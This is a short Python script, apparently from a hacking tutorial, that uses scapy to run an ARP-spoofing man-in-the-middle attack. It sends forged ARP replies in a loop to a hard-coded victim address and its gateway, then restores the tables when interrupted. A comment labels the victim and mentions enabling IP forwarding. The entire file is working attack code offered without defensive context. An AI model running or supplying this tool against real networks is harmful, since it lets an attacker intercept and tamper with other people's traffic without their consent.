import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)

    return answered[0][1].hwsrc


def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    scapy.send(packet, verbose=False)

# victim ip 192.168.43.70 target ip 192.168.43.1


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


packets = 0

try:
    while True:
        spoof('192.168.43.70', '192.168.43.1')
        spoof('192.168.43.1', '192.168.43.70')
        packets += 2
        print('\rSent Packets: ' + str(packets), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\nCtrl C detected....quiting')
    restore('192.168.43.70', '192.168.43.1')
    restore('192.168.43.1', '192.168.43.70')
# enable ip forwarding loops video.

